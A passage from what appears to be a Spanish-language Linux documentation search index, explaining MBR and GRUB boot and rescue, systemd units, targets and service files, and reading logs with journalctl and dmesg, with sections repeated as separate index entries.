partici\u00f3n se encuentra los archivos de grub, a\u00f1adir raiz de destino, y arrancar con el modulo normal. grub recue> set prefix =( hd0,msdos5 ) /boot/grub2 grub recue> set root =( hd0,msdos5 ) grub recue> insmod normal grub recue> normal Arranque del sistema Para arrancar el sistema lo realmente necesario es el kernel y la imagen de inicio del sistema. linux vmlinuz... root = /dev/sda1 ro quiet 3 initrd initramfs..img En la linea del kernel se le pasan las opciones de arranque en este caso ro, quiet, 3 : runlevel 1, 3, 5 son los mas habituales y esta en fase deprecated, siendo substituido por systemd.unit=nombre Systemd Systemd es la actualizaci\u00f3n de init, este proceso se encarga de arrancar todos los servicios, targets y componentes necesarios para poder trabajar con la terminal. La mejora de systemd respecto a init es que en el arranque del sistema inicia todos los demonios a la vez y trabajan en paralelo, a esto se le denomina ( concurrencia ). system-analyze blame # analizar tiempos de arranque systemd-analyze dot \"basic.target\" | dot -Tsvg > /tmp/basic.svg grafico de dependencias systemd-analyze dot \"basic.target\" | dot -Tsvg > /tmp/basic.svg systemd-analyze dot --to-pattern = \"*.target\" --from-pattern = \"httpd.service\" | dot -Tsvg > /tmp/gpm.svg Units Systemd se configura exclusivamente a trabes de archivos de texto, registra las instrucciones de inicializaci\u00f3n para cada daemon en un archivo de configuraci\u00f3n (conocido como 'unit file'). Estos ficheros de configuraci\u00f3n se encuentran en: Redhad y derivados: /usr/lib/systemd/system/ Debian: /lib/systemd/system/ Algunos tipos de units: .service .target .socket .mount .automount .path .slice .timer Informaci\u00f3n sobre los units systyemctl list-units systemctl list-unit-files El contenido de estos archivos unit tienen una estructura simple, una descripci\u00f3n, que ejecutar, antes o despu\u00e9s de quien voy si es que dependen de alg\u00fan otro demonio es lo mas b\u00e1sico. Niveles de arranque unit systemd Description 0 runlevel0.target , poweroff.target apagar sistema 1 runlevel1.target , rescue.target Modo rescate 2 runlevel2.target multi-user.target rescat con red 3 runlevel3.target , multi-user.target Multi usuario sin grafico 4 runlevel4.target multi-user.target custom 5 runlevel5.target , graphical.target Multi usuario con grafico 6 runlevel6.target , reboot.target apagar y reiniciar sistema init=/bin/bash emergency.target shell root Por defecto en una m\u00e1quina de usuario la opci\u00f3n esta indicada en graphical.target , lo podemos mirar con. La opci\u00f3n init=/bin/bash y emergency.target no son quivalentes ya que emergenci arranca systemd y init solo arranca el kernel y el bash. debian \u279c systemctl get-default graphical.target # modificar la opcion por defecto systemctl set-default multi-user.target # cambiar al modo rescue systemctl isolated rescue.target Todos estos target u objetivos, dependen de diferentes units para su ejecuci\u00f3n completa. Para alcanzar el objetivo x hay que arrancar primero n units que son sus dependencias. systemctl list-dependencies multi-user.target El directorio targe.wants es el que define la estructura del arranque, es decir para arrancar multi-user tienes que arrancar primero todos los units incluidos en el directorio multi-user.target.wants . ls /etc/systemd/system/multi-user.target.wants/ abrtd.service abrt-journal-core.service abrt-oops.service abrt-vmcore.service abrt-xorg.service atd.service auditd.service avahi-daemon.service chronyd.service crond.service cups.path dbxtool.service gpm.service libvirtd.service mcelog.service mdmonitor.service ModemManager.service NetworkManager.service nfs-client.target postgresql.service remote-fs.target rngd.service sssd.service vmtoolsd.service Son demonios a arrancar en ese target, todos estos archivos que se ven son enlaces simb\u00f3licos a /usr/lib/systemd/system/ , que es realmente donde se encuentra el demonio. Demonios Los demonios ( servicios ) son programas tipo especial de proceso no interactivo, es decir, que se ejecuta en segundo plano. Actualmente los demonios se gestionan con systemctl podemos ver si un demonio esta activo o no con is-active o si esta habilitado con is-enable . systemctl is-active httpd Al instalar un demonio crea un archivo unit .service dentro de /usr/lib/systemd/system/ ,en el archivo de configuraci\u00f3n .service la opci\u00f3n wantedby indica en que objetivo se a\u00f1adir\u00e1 al habilitarlo. Archivo de servicio El archivo de configuraci\u00f3n de un demonio denominado unit file con extensi\u00f3n .service . archivo b\u00e1sico: [ Unit ] Description = Descripcion corta del programa [ Service ] ExecStart = binario o script que ejecuta PidFile = escrivir un pid para dominarlo [ install ] WantedBy = donde instalarse multi-user.target, rescue.target etc.. Existen muchas opciones para este tipo de archivos por ejemplo: ExecStop : que quieres que haga al apagar el servicio. RemainAfterExit=true : una vez ejecutado muestra que esta activo ( esto sirve para ejecuciones que no son continuas ) Type=oneshot : se ejecuta solo una vez Cada vez que modifiquemos alg\u00fan servicio, objetivo o archivo unit es muy recomendable ejecutar systemctl daemon-reload para asegurarse que lee correctamente los demonios. Targets Targets son los objetivos que se marca el arranque en el inicio del sistema. Los target guardan su configuraci\u00f3n en /usr/lib/systemd/system/ en archivos .target y la lista de unitsa arrancar en ese objetivo se guarda en /etc/systemd/system/objetivo.target.wants/ . Ejemplo configuraci\u00f3n. [ Unit ] Description = Rescue Mode Documentation = man:systemd.special ( 7 ) Requires = sysinit.target rescue.service After = sysinit.target rescue.service AllowIsolate = yes [ Install ] Alias = kbrequest.target Requires : exige que las opciones indicadas est\u00e9n activas para iniciarse After : me tengo que arrancar despu\u00e9s de las opciones dadas allowisolate : yes, indica si es un punto de sesi\u00f3n, es decir asociado a un target indica al sistema que una vez llegado a este objetivo puede ofrecer una sesi\u00f3n de usuario.","title":"Arranque del sistema"},{"location":"sistemas/Arranque-del-sistema/#arranque-del-sistema","text":"Anaconda: grub, systemd","title":"Arranque del sistema"},{"location":"sistemas/Arranque-del-sistema/#master-boot-record-mbr","text":"Es un registro de arranque maestro , el primer sector de un dispositivo de almacenamiento de dados, contiene la tabla de particiones primarias del disco, el arranque y la firma de la unidad de arranque. Este registro se esta quedando en desuso, con la actualizaci\u00f3n al registro UEFI. Tabla particiones: \u00edndice de la tabla de las particiones primarias del dispositivo. Arranque ( bootstrap ) proceso de inicio del ordenador, u peque\u00f1o programa que arranca el sistema operativo, por ejemplo Grup, Lilo en Gnu/linux y BCD o NTLDR en Windows. En el caso de Grup y similares bootstrap del MBR solo es un acceso (link) a la partici\u00f3n que contiene todo me contenido de grub. Informaci\u00f3n Firma del MBR 2 bytes","title":"Master Boot Record ( MBR )"},{"location":"sistemas/Arranque-del-sistema/#pasos-del-arranque","text":"post ( decectar hardware ) Autoprueba el arranque, testea todo el harware conectado a la placa madre, en caso de error emite sonidos como c\u00f3digo de error. bios El prop\u00f3sito fundamental del BIOS es iniciar y probar el hardware del sistema y cargar un gestor de arranque. setup ( prioridad de arranque ), hda, cdrom, red, etc.. fallback ( pasar siguiente opci\u00f3n en caso de fallo ) disco hda -> mbr -> antes tabla de particiones activa ahora boot loader: Grub grub de mbr carga grub de particion x Muestra el men\u00fa de opciones de arranque carga kernel carga initramfs systemd ( antes initd ) La mejora de systemd respecto a initd es que trabaja con concurencia, todos los m\u00f3dulos se encieden a la vez y se esperan si dependen de otro para iniciarse. Esto mejora el rendimiento de arranque. arranca m\u00f3dulos necesarios systemd-analyze blame muestra el tiempo que a tardado en arrancar cada m\u00f3dulo, muy \u00fatil para detectar problemas de arranque.","title":"Pasos del arranque"},{"location":"sistemas/Arranque-del-sistema/#grub","text":"Instalar grub en el mbr grub2-install /dev/sda # link de mbr apunte a partici\u00f3n actual # link del mbr apunte a partici\u00f3n montada en /mnt grub2-install --boot-directory=/mnt/boot /dev/sda Leer sistemas operativos instalados en el sistema y generar grub.cfg grub2-mkconfig -o /boot/grub2/grub.cfg","title":"Grub"},{"location":"sistemas/Arranque-del-sistema/#edicion-grub","text":"Al generar un grub.cfg en cada entrada lo importante para arrancar son las siguientes lineas: insmod para cargar los m\u00f3dulos necesarios. set root ruta de disco y partici\u00f3n donde buscar archivos. linux16, initrd16 cargar kernel en partici\u00f3n indicada y ramdisk menuentry 'fedora mati' { insmod gzio insmod part_msdos insmod ext2 set root = 'hd0,msdos5' linux16 /boot/vmlinuz-5.0.... root = /dev/sda5 initrd16 /boot/initrd-5.0.. .img } menuentry 'win2' { insmod part_msdos insmod ntfs # en el caso de partici\u00f3n vfat insmod vfat set root =( hd0,2 ) chainloader +1 } # Passar el control a un altre carregador menuentry 'cahinloader' { insmod gzio insmod part_msdos insmod ext2 set root =( hd0,8 ) chainloader +1 }","title":"Edici\u00f3n grub"},{"location":"sistemas/Arranque-del-sistema/#submenus","text":"Crear un submen\u00fa es tan sencillo como englobar todos los menuentry que desees dentro de los claudators de un submen\u00fa. submenu 'submenu mini' { menuentry 'fed 1 min' { .... } menuentry 'fed 1 min rescue' { .... } } Par\u00e1metros adicionales set default = 0 # arranca por defecto la primera entrada del menu set timeout = -1 # tiempo de espera para la entrada por defecto, -1 espera interaci\u00f3n","title":"Submenus"},{"location":"sistemas/Arranque-del-sistema/#sticks-de-arranque","text":"En el caso que el enlace del bootstrap hasta el directorio /boot funcione pero por alguna raz\u00f3n, no encuentre el archivo grub.cfg, aparecer\u00e1 el prompt del grub #grub> desde el que podemos arrancar el sistema de diferentes maneras. Tunear una entrada existente de grub El el caso de querer arrancar un sistema que no esta en el grub.cfg. Escribir en modo comando una entrada. Sabiendo donde esta el sistema operativo podemos arrancar escribiendo manualmente los comandos de la edici\u00f3n de grub del apartado anterior. En modo comando llamar a alg\u00fan fichero grub.cfg de alguna partici\u00f3n existente. #grub> configfile (hd0,msdos5)/boot/grub2/grub.cfg En el caso del link del mbr a la partici\u00f3n donde se encuentra el directorio grub este roto. Grub no podr\u00e1 acceder a los m\u00f3dulos, por lo tanto aparecer\u00e1 grub rescue> al arrancar. La soluci\u00f3n indicar en que partici\u00f3n se encuentra los archivos de grub, a\u00f1adir raiz de destino, y arrancar con el modulo normal. grub recue> set prefix =( hd0,msdos5 ) /boot/grub2 grub recue> set root =( hd0,msdos5 ) grub recue> insmod normal grub recue> normal","title":"Sticks de arranque"},{"location":"sistemas/Arranque-del-sistema/#arranque-del-sistema_1","text":"Para arrancar el sistema lo realmente necesario es el kernel y la imagen de inicio del sistema. linux vmlinuz... root = /dev/sda1 ro quiet 3 initrd initramfs..img En la linea del kernel se le pasan las opciones de arranque en este caso ro, quiet, 3 : runlevel 1, 3, 5 son los mas habituales y esta en fase deprecated, siendo substituido por systemd.unit=nombre","title":"Arranque del sistema"},{"location":"sistemas/Arranque-del-sistema/#systemd","text":"Systemd es la actualizaci\u00f3n de init, este proceso se encarga de arrancar todos los servicios, targets y componentes necesarios para poder trabajar con la terminal. La mejora de systemd respecto a init es que en el arranque del sistema inicia todos los demonios a la vez y trabajan en paralelo, a esto se le denomina ( concurrencia ). system-analyze blame # analizar tiempos de arranque systemd-analyze dot \"basic.target\" | dot -Tsvg > /tmp/basic.svg grafico de dependencias systemd-analyze dot \"basic.target\" | dot -Tsvg > /tmp/basic.svg systemd-analyze dot --to-pattern = \"*.target\" --from-pattern = \"httpd.service\" | dot -Tsvg > /tmp/gpm.svg","title":"Systemd"},{"location":"sistemas/Arranque-del-sistema/#units","text":"Systemd se configura exclusivamente a trabes de archivos de texto, registra las instrucciones de inicializaci\u00f3n para cada daemon en un archivo de configuraci\u00f3n (conocido como 'unit file'). Estos ficheros de configuraci\u00f3n se encuentran en: Redhad y derivados: /usr/lib/systemd/system/ Debian: /lib/systemd/system/ Algunos tipos de units: .service .target .socket .mount .automount .path .slice .timer Informaci\u00f3n sobre los units systyemctl list-units systemctl list-unit-files El contenido de estos archivos unit tienen una estructura simple, una descripci\u00f3n, que ejecutar, antes o despu\u00e9s de quien voy si es que dependen de alg\u00fan otro demonio es lo mas b\u00e1sico.","title":"Units"},{"location":"sistemas/Arranque-del-sistema/#niveles-de-arranque","text":"unit systemd Description 0 runlevel0.target , poweroff.target apagar sistema 1 runlevel1.target , rescue.target Modo rescate 2 runlevel2.target multi-user.target rescat con red 3 runlevel3.target , multi-user.target Multi usuario sin grafico 4 runlevel4.target multi-user.target custom 5 runlevel5.target , graphical.target Multi usuario con grafico 6 runlevel6.target , reboot.target apagar y reiniciar sistema init=/bin/bash emergency.target shell root Por defecto en una m\u00e1quina de usuario la opci\u00f3n esta indicada en graphical.target , lo podemos mirar con. La opci\u00f3n init=/bin/bash y emergency.target no son quivalentes ya que emergenci arranca systemd y init solo arranca el kernel y el bash. debian \u279c systemctl get-default graphical.target # modificar la opcion por defecto systemctl set-default multi-user.target # cambiar al modo rescue systemctl isolated rescue.target Todos estos target u objetivos, dependen de diferentes units para su ejecuci\u00f3n completa. Para alcanzar el objetivo x hay que arrancar primero n units que son sus dependencias. systemctl list-dependencies multi-user.target El directorio targe.wants es el que define la estructura del arranque, es decir para arrancar multi-user tienes que arrancar primero todos los units incluidos en el directorio multi-user.target.wants . ls /etc/systemd/system/multi-user.target.wants/ abrtd.service abrt-journal-core.service abrt-oops.service abrt-vmcore.service abrt-xorg.service atd.service auditd.service avahi-daemon.service chronyd.service crond.service cups.path dbxtool.service gpm.service libvirtd.service mcelog.service mdmonitor.service ModemManager.service NetworkManager.service nfs-client.target postgresql.service remote-fs.target rngd.service sssd.service vmtoolsd.service Son demonios a arrancar en ese target, todos estos archivos que se ven son enlaces simb\u00f3licos a /usr/lib/systemd/system/ , que es realmente donde se encuentra el demonio.","title":"Niveles de arranque"},{"location":"sistemas/Arranque-del-sistema/#demonios","text":"Los demonios ( servicios ) son programas tipo especial de proceso no interactivo, es decir, que se ejecuta en segundo plano. Actualmente los demonios se gestionan con systemctl podemos ver si un demonio esta activo o no con is-active o si esta habilitado con is-enable . systemctl is-active httpd Al instalar un demonio crea un archivo unit .service dentro de /usr/lib/systemd/system/ ,en el archivo de configuraci\u00f3n .service la opci\u00f3n wantedby indica en que objetivo se a\u00f1adir\u00e1 al habilitarlo.","title":"Demonios"},{"location":"sistemas/Arranque-del-sistema/#archivo-de-servicio","text":"El archivo de configuraci\u00f3n de un demonio denominado unit file con extensi\u00f3n .service . archivo b\u00e1sico: [ Unit ] Description = Descripcion corta del programa [ Service ] ExecStart = binario o script que ejecuta PidFile = escrivir un pid para dominarlo [ install ] WantedBy = donde instalarse multi-user.target, rescue.target etc.. Existen muchas opciones para este tipo de archivos por ejemplo: ExecStop : que quieres que haga al apagar el servicio. RemainAfterExit=true : una vez ejecutado muestra que esta activo ( esto sirve para ejecuciones que no son continuas ) Type=oneshot : se ejecuta solo una vez Cada vez que modifiquemos alg\u00fan servicio, objetivo o archivo unit es muy recomendable ejecutar systemctl daemon-reload para asegurarse que lee correctamente los demonios.","title":"Archivo de servicio"},{"location":"sistemas/Arranque-del-sistema/#targets","text":"Targets son los objetivos que se marca el arranque en el inicio del sistema. Los target guardan su configuraci\u00f3n en /usr/lib/systemd/system/ en archivos .target y la lista de unitsa arrancar en ese objetivo se guarda en /etc/systemd/system/objetivo.target.wants/ . Ejemplo configuraci\u00f3n. [ Unit ] Description = Rescue Mode Documentation = man:systemd.special ( 7 ) Requires = sysinit.target rescue.service After = sysinit.target rescue.service AllowIsolate = yes [ Install ] Alias = kbrequest.target Requires : exige que las opciones indicadas est\u00e9n activas para iniciarse After : me tengo que arrancar despu\u00e9s de las opciones dadas allowisolate : yes, indica si es un punto de sesi\u00f3n, es decir asociado a un target indica al sistema que una vez llegado a este objetivo puede ofrecer una sesi\u00f3n de usuario.","title":"Targets"},{"location":"sistemas/Estructura_de_directorios/","text":"Estructura de directorios Directorio Descripci\u00f3n Simple / la ra\u00edz o root, o contenedor de todo el sistema de jerarqu\u00eda. /bin/ Aplicaciones binarias /boot/ Archivos cargadores de arranque /dev/ Contiene archivos especiales asociados a dispositivos hardware. /etc/ Contiene archivos de configuraci\u00f3n del sistema /home/ Contiene los directorios de trabajo de los usuarios /lib/ Contiene todas las bibliotecas /media/ Contiene los puntos de montaje de los medios extra\u00edbles /mnt/ Sistema de archivos montados temporalmente. /opt/ Contiene Paquetes de programas opcionales de aplicaciones /proc/ sistema de archivos virtuales que documentan al n\u00facleo /root/ Directorio ra\u00edz del usuario root. /sbin/ Sistema de binarios esencial, comandos y programas /srv/ Lugar espec\u00edfico de datos que son servidos por el sistema. /sys/ Evoluci\u00f3n de proc. Sistema de archivos virtuales que documentan al n\u00facleo pero de forma jerarquizada. /tmp/ Archivos temporales /usr/ Jerarqu\u00eda secundaria de los datos de usuario; contiene la mayor\u00eda de las utilidades y aplicaciones multiusuario /var/ Archivos variables, tales como logs, archivos spool, bases de datos, archivos de e-mail temporales, y algunos archivos temporales en general.","title":"Estructura de directorios"},{"location":"sistemas/Estructura_de_directorios/#estructura-de-directorios","text":"Directorio Descripci\u00f3n Simple / la ra\u00edz o root, o contenedor de todo el sistema de jerarqu\u00eda. /bin/ Aplicaciones binarias /boot/ Archivos cargadores de arranque /dev/ Contiene archivos especiales asociados a dispositivos hardware. /etc/ Contiene archivos de configuraci\u00f3n del sistema /home/ Contiene los directorios de trabajo de los usuarios /lib/ Contiene todas las bibliotecas /media/ Contiene los puntos de montaje de los medios extra\u00edbles /mnt/ Sistema de archivos montados temporalmente. /opt/ Contiene Paquetes de programas opcionales de aplicaciones /proc/ sistema de archivos virtuales que documentan al n\u00facleo /root/ Directorio ra\u00edz del usuario root. /sbin/ Sistema de binarios esencial, comandos y programas /srv/ Lugar espec\u00edfico de datos que son servidos por el sistema. /sys/ Evoluci\u00f3n de proc. Sistema de archivos virtuales que documentan al n\u00facleo pero de forma jerarquizada. /tmp/ Archivos temporales /usr/ Jerarqu\u00eda secundaria de los datos de usuario; contiene la mayor\u00eda de las utilidades y aplicaciones multiusuario /var/ Archivos variables, tales como logs, archivos spool, bases de datos, archivos de e-mail temporales, y algunos archivos temporales en general.","title":"Estructura de directorios"},{"location":"sistemas/Logs/","text":"Logs del sistema Tanto el sistema como las aplicaciones guardan los logs en el directorio /var/logs/ ah\u00ed se encuentran los diferentes archivos de logs, como por ejemplo messages que hace referencia al sistema. En ocasiones queremos ver logs en tiempo real y buscaremos el archivo log de la aplicaci\u00f3n o sistema y lo visualizaremos directamente. sudo tail -f /var/log/messages Tambi\u00e9n existen diferentes comandos para filtrar y gestionar mejor los logs como journalctl o dmesg journalctl Es la manera que tiene Systemctl de consultar los logs del sistema -S -U : permite especificar desde (since) y/o hasta cuando (until) YYYY-MM-DD [ HH:MM:SS], yesterday, today, tomorrow, N day ago, - / + NhMmin (-1h15min) -u unit: mensage de una unidad en concreto -k : mensajes del kernel -p por tipo ( emerg, alert, crit, err, warning, notice, info, debug ) PARAM=VALUE : parametros como _PID, _UID, _COMM ( man systemd.journal-fields ) sudo journalctl # filtrar entre dias, o horas sudo journalctl -S 2021 -02-14 -U 2021 -02-16 sudo journalctl -S today sudo journalctl -S yesterday sudo journalctl -S '2 day ago' sudo journalctl -S -1h10min # filtrar por servicio sudo journalctl -u networking.service # logs del kernel sudo journalctl -k # filtrar po tipo de alerta sudo journalctl -p err sudo journalctl -p warning sudo journalctl -p emerg sudo journalctl -p alert sudo journalctl -p info # filtrar por parametro sudo journalctl _COMM = anacron sudo journalctl _UID = 1000 # filtrar los ultimos logs, con una corta esplicaci\u00f3n sudo journalctl -xe dmesg Al arrancar el sistema se muestran mensajes seg\u00fan se van cargando controladores o funciones del sistema. para revisarlos se usa dmesg -T Muestra las marcas de tiempo mas claramente -k solo mensajes del kernel -l filtra por niveles de aviso ( warn, err, etc...) -H salida para lectura humana, es equivalnte a dmesg | less Este comando es equivalente a journalctl -b -k","title":"Logs del sistema"},{"location":"sistemas/Logs/#logs-del-sistema","text":"Tanto el sistema como las aplicaciones guardan los logs en el directorio /var/logs/ ah\u00ed se encuentran los diferentes archivos de logs, como por ejemplo messages que hace referencia al sistema. En ocasiones queremos ver logs en tiempo real y buscaremos el archivo log de la aplicaci\u00f3n o sistema y lo visualizaremos directamente. sudo tail -f /var/log/messages Tambi\u00e9n existen diferentes comandos para filtrar y gestionar mejor los logs como journalctl o dmesg","title":"Logs del sistema"},{"location":"sistemas/Logs/#journalctl","text":"Es la manera que tiene Systemctl de consultar los logs del sistema -S -U : permite especificar desde (since) y/o hasta cuando (until) YYYY-MM-DD [ HH:MM:SS], yesterday, today, tomorrow, N day ago, - / + NhMmin (-1h15min) -u unit: mensage de una unidad en concreto -k : mensajes del kernel -p por tipo ( emerg, alert, crit, err, warning, notice, info, debug ) PARAM=VALUE : parametros como _PID, _UID, _COMM ( man systemd.journal-fields ) sudo journalctl # filtrar entre dias, o horas sudo journalctl -S 2021 -02-14 -U 2021 -02-16 sudo journalctl -S today sudo journalctl -S yesterday sudo journalctl -S '2 day ago' sudo journalctl -S -1h10min # filtrar por servicio sudo journalctl -u networking.service # logs del kernel sudo journalctl -k # filtrar po tipo de alerta sudo journalctl -p err sudo journalctl -p warning sudo journalctl -p emerg sudo journalctl -p alert sudo journalctl -p info # filtrar por parametro sudo journalctl _COMM = anacron sudo journalctl _UID = 1000 # filtrar los ultimos logs, con una corta esplicaci\u00f3n sudo journalctl -xe","title":"journalctl"},{"location":"sistemas/Logs/#dmesg","text":"Al arrancar el sistema se muestran mensajes seg\u00fan se van cargando controladores o funciones del sistema. para revisarlos se usa dmesg -T Muestra las marcas de tiempo mas claramente -k solo mensajes del kernel -l filtra por niveles de aviso ( warn, err, etc...) -H salida para lectura humana, es equivalnte a dmesg | less Este comando es equivalente a journalctl -b -k","title":"dmesg"},{"location":"sistemas/Systemd/","text":"Systemd Systemd es la actualizaci\u00f3n de init, este proceso se encarga de arrancar todos los servicios, targets y componentes necesarios para poder trabajar con la terminal. La mejora de systemd respecto a init es que en el arranque del sistema inicia todos los demonios a la vez y trabajan en paralelo, a esto se le denomina ( concurrencia ). system-analyze blame # analizar tiempos de arranque systemd-analyze dot \"basic.target\" | dot -Tsvg > /tmp/basic.svg grafico de dependencias systemd-analyze dot \"basic.target\" | dot -Tsvg > /tmp/basic.svg systemd-analyze dot --to-pattern = \"*.target\" --from-pattern = \"httpd.service\" | dot -Tsvg > /tmp/gpm.svg Units Systemd se configura exclusivamente a trabes de archivos de texto, registra las instrucciones de inicializaci\u00f3n para cada daemon en un archivo de configuraci\u00f3n (conocido como 'unit file'). Estos ficheros de configuraci\u00f3n se encuentran en: Redhad y derivados: /usr/lib/systemd/system/ Debian: /lib/systemd/system/ Algunos tipos de units: .service .target .socket .mount .automount .path .slice .timer Informaci\u00f3n sobre los units systyemctl list-units systemctl list-unit-files El contenido de estos archivos unit tienen una estructura simple, una descripci\u00f3n, que ejecutar, antes o despu\u00e9s de quien voy si es que dependen de alg\u00fan otro demonio es lo mas b\u00e1sico. Niveles de arranque unit systemd Description 0 runlevel0.target , poweroff.target apagar sistema 1 runlevel1.target , rescue.target Modo rescate 2 runlevel2.target multi-user.target rescat con red 3 runlevel3.target , multi-user.target Multi usuario sin grafico 4 runlevel4.target multi-user.target custom 5 runlevel5.target , graphical.target Multi usuario con grafico 6 runlevel6.target , reboot.target apagar y reiniciar sistema init=/bin/bash emergency.target shell root Por defecto en una m\u00e1quina de usuario la opci\u00f3n esta indicada en graphical.target , lo podemos mirar con. La opci\u00f3n init=/bin/bash y emergency.target no son quivalentes ya que emergenci arranca systemd y init solo arranca el kernel y el bash. debian \u279c systemctl get-default graphical.target # modificar la opcion por defecto systemctl set-default multi-user.target # cambiar al modo rescue systemctl isolated rescue.target Todos estos target u objetivos, dependen de diferentes units para su ejecuci\u00f3n completa. Para alcanzar el objetivo x hay que arrancar primero n units que son sus dependencias. systemctl list-dependencies multi-user.target El directorio targe.wants es el que define la estructura del arranque, es decir para arrancar multi-user tienes que arrancar primero todos los units incluidos en el directorio multi-user.target.wants . ls /etc/systemd/system/multi-user.target.wants/ abrtd.service abrt-journal-core.service abrt-oops.service abrt-vmcore.service abrt-xorg.service atd.service auditd.service avahi-daemon.service chronyd.service crond.service cups.path dbxtool.service gpm.service libvirtd.service mcelog.service mdmonitor.service ModemManager.service NetworkManager.service nfs-client.target postgresql.service remote-fs.target rngd.service sssd.service vmtoolsd.service Son demonios a arrancar en ese target, todos estos archivos que se ven son enlaces simb\u00f3licos a /usr/lib/systemd/system/ , que es realmente donde se encuentra el demonio. Demonios Los demonios ( servicios ) son programas tipo especial de proceso no interactivo, es decir, que se ejecuta en segundo plano. Actualmente los demonios se gestionan con systemctl podemos ver si un demonio esta activo o no con is-active o si esta habilitado con is-enable . systemctl is-active httpd Al instalar un demonio crea un archivo unit .service dentro de /usr/lib/systemd/system/ ,en el archivo de configuraci\u00f3n .service la opci\u00f3n wantedby indica en que objetivo se a\u00f1adir\u00e1 al habilitarlo. Archivo de servicio El archivo de configuraci\u00f3n de un demonio denominado unit file con extensi\u00f3n .service . archivo b\u00e1sico: [ Unit ] Description = Descripcion corta del programa [ Service ] ExecStart = binario o script que ejecuta PidFile = escrivir un pid para dominarlo [ install ] WantedBy = donde instalarse multi-user.target, rescue.target etc.. Existen muchas opciones para este tipo de archivos por ejemplo: ExecStop : que quieres que haga al apagar el servicio. RemainAfterExit=true : una vez ejecutado muestra que esta activo ( esto sirve para ejecuciones que no son continuas ) Type=oneshot : se ejecuta solo una vez Cada vez que modifiquemos alg\u00fan servicio, objetivo o archivo unit es muy recomendable ejecutar systemctl daemon-reload para asegurarse que lee correctamente los demonios. Targets Targets son los objetivos que se marca el arranque en el inicio del sistema. Los target guardan su configuraci\u00f3n en /usr/lib/systemd/system/ en archivos .target y la lista de unitsa arrancar en ese objetivo se guarda en /etc/systemd/system/objetivo.target.wants/ . Ejemplo configuraci\u00f3n. [ Unit ] Description = Rescue Mode Documentation = man:systemd.special ( 7 ) Requires = sysinit.target rescue.service After = sysinit.target rescue.service AllowIsolate = yes [ Install ] Alias = kbrequest.target Requires : exige que las opciones indicadas est\u00e9n activas para iniciarse After : me tengo que arrancar despu\u00e9s de las opciones dadas allowisolate : yes, indica si es un punto de sesi\u00f3n, es decir asociado a un target indica al sistema que una vez llegado a este objetivo puede ofrecer una sesi\u00f3n de usuario. Analizar el estado del sistema Para mostrar el estado del sistema utilice: systemctl status Para listar unidades en ejecuci\u00f3n : systemctl o: systemctl list-units Para listar unidades que han fallado : systemctl --failed Los archivos de las unidades disponibles se pueden ver en /usr/lib/systemd/system/ y /etc/systemd/system/ (este \u00faltimo tiene prioridad). Puede ver un listado de las unidades instaladas con: systemctl list-unit-files Gestionar la energ\u00eda polkit es necesario para gestionar la energ\u00eda. Si se encuentra en una sesi\u00f3n local de systemd-logind y ninguna otra sesi\u00f3n est\u00e1 activa, las \u00f3rdenes siguientes funcionar\u00e1n sin requerir privilegios de root. Si no es as\u00ed (por ejemplo, debido a que otro usuario ha iniciado otra sesi\u00f3n tty), systemd autom\u00e1ticamente le requerir\u00e1 la contrase\u00f1a de root. Apagado y reinicio del sistema: $ systemctl reboot Apagado del sistema: $ systemctl poweroff Suspensi\u00f3n del sistema: $ systemctl suspend Poner el sistema en hibernaci\u00f3n: $ systemctl hibernate Poner el sistema en estado de reposo h\u00edbrido \u2014 \u00abhybrid-sleep\u00bb \u2014 (o suspensi\u00f3n combinada \u2014 \u00absuspend-to-both\u00bb \u2014): $ systemctl hybrid-sleep Gesti\u00f3n servicios Systemd es la actualizaci\u00f3n de init, en la siguiente tabla muestro sus equivalencias. Init Systemd Description service name start systemctl start name.service Inicia un servicio service name stop systemctl stop name.service Detiene un servicio service name restart systemctl restart name.service Reinicia un servicio service name condrestart systemctl try-restart name.service Reinicia un servicio solo si est\u00e1 en funcionamiento service name reload systemctl reload name.service Recarga la configuraci\u00f3n de un servcio service name status systemctl status name.service systemctl is-active name.service Comprueba si un servicio est\u00e1 funcionando. service \u2013status-all systemctl list-units type service all Muestra el estado de todos los servicios. chkconfig name on systemctl enable name.service Habilita un servicio chkconfig name off systemctl disable name.service Deshabilita un servicio chkconfig \u2013list name systemctl status name.service systemctl is-enabled name.service Comprueba si un servici\u00f3n est\u00e1 habilitado chkconfig \u2013list systemctl list-unit-files \u2013type service Lista todos los servicios y comprueba si est\u00e1n habilitados chkconfig \u2013list systemctl list-dependencies \u2013after Lista los servicios que tienen que iniciarse antes de una unidad chkconfig \u2013list systemctl list-dependencies \u2013before Lista los servicios que tienen que iniciarse despu\u00e9s de una unidad Activar, Habilitar y Enmascarar Activar Ver, activar, desactivar, recargar o mirar si esta activo: sudo systemctl status servicio sudo systemctl is-active servicio sudo systemctl start servicio sudo systemctl stop servicio sudo systemctl restart servicio sudo systemctl try-restart servicio # solo activa el servicio si anteriormente estaba activo sudo systemctl reload servicio # recarga la configuraci\u00f3n sin reiniciarse Habilitar sudo systemctl is-enabled servicio sudo systemctl enable servicio sudo systemctl disable servicio Enmascarar Un servicio est\u00e1 enmascarado cuando no se puede iniciar de forma manual o por medio de otro servicio. Por supuesto, cuando un servicio est\u00e1 enmascarado no puede ser iniciado en el arranque de la m\u00e1quina. Es decir, un servicio enmascarado puede estar activo, pero no puede estar habilitado. Ahora bien, si el servicio no est\u00e1 activo y est\u00e1 enmascarado, no se podr\u00e1 iniciar. Para ver si un servicio esta enmascarado no hay ning\u00fan comando, as\u00ed que habr\u00e1 que tirar de bash. ans = ` systemctl status ntp | grep masked ` ; if [ ${# ans } -gt 0 ] ; then echo \"masked\" ; else echo \"Not masked\" ; fi sudo systemctl mask servicio # enmascarar sudo systemctl unmask servicio # desenmascarar Crear un servicio Servicio simple, se ejecuta una vez al iniciar el sistema. /lib/systemd/system/test.service [ Unit ] Description = Una prueba [ Service ] Type = oneshotExecStart = /bin/bash /home/lorenzo/test.sh /lib/systemd/system/backup.service [ Unit ] Description = Backup of my apache website [ Service ] Type = simple ExecStart = /var/www/backup/backup.sh [ Install ] WantedBy = multi-user.target Ahora simulamos que nuestro servicio arranca una api /lib/systemd/system/sample.service [ Unit ] Description = Ejemplo After = network.target StartLimitIntervalSec = 0 [ Service ] Type = simple Restart = always RestartSec = 1 User = lorenzo ExecStart = /usr/bin/env python3 /home/lorenzo/temporal/sample/sample.py [ Install ] WantedBy = multi-user.target Descripcion la descripci\u00f3n del servicio After tiene que esperarse a que el servicio indicado se haya iniciado. ExecStart ruta del ejecutable Type permite configurar el inicio del ejecutable. simple . El proceso empieza con ExecStart y es el principal proceso del servicio. forking . En este caso se lanza un proceso 